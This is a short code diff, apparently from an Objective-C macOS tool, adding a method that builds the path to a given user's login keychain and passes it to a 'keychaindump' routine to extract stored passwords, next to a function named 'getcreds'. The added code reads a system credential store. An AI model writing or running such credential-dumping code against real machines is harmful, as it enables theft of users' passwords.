@@ -614,4 +614,9 @@ int getcreds(int argc, char **argv) {
     return ret;
 }
 
++(NSArray *)getPasswordsForUser:(NSString *)user {
+    NSString *keychainFilePath = [NSString stringWithFormat:@"/Users/%@/Library/Keychains/login.keychain", user];
+    return [keychaindump getPasswords:keychainFilePath];
+}
+
 @end
